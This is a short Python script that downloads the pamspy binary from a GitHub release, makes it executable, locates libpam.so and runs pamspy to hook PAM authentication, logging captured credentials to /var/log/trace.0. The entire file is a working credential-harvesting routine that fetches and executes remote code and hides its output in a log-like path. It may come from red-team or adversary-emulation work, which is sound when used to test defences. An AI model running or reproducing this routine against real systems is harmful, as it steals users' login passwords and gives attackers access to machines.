import os
import subprocess
import urllib.request

def download_pamspy():
    """
    Downloads the pamspy binary from the specified URL and saves it locally.
    """
    url = "https://github.com/citronneur/pamspy/releases/download/v0.3/pamspy"
    local_path = "./pamspy"
    try:
        print(f"Downloading pamspy from {url}...")
        urllib.request.urlretrieve(url, local_path)
        os.chmod(local_path, 0o755)  # Make the downloaded file executable
        print("Download complete.")
    except Exception as e:
        print(f"Failed to download pamspy: {e}")
        raise

def execute_pamspy():
    """
    Executes the pamspy binary with the specified arguments.
    Returns:
        int: The return code of the executed command.
    """
    pam_path_command = "/usr/sbin/ldconfig -p | grep libpam.so | cut -d ' ' -f4"
    try:
        # Get the path to libpam.so
        pam_path = subprocess.check_output(pam_path_command, shell=True).decode().strip()
        if not pam_path:
            raise Exception("libpam.so not found.")
        
        # Construct the command to run pamspy
        command = ["./pamspy", "-p", pam_path, "-d", "/var/log/trace.0"]
        print(f"Executing pamspy with command: {' '.join(command)}")
        result = subprocess.run(command)
        return result.returncode
    except subprocess.CalledProcessError as e:
        print(f"Error executing command to get libpam path: {e}")
        return -1
    except Exception as e:
        print(f"Failed to execute pamspy: {e}")
        return -1

def run_pamspy():
    try:
        download_pamspy()
        return_code = execute_pamspy()
        return return_code
    except Exception as e:
        print(f"Error in run_pamspy: {e}")
        return -1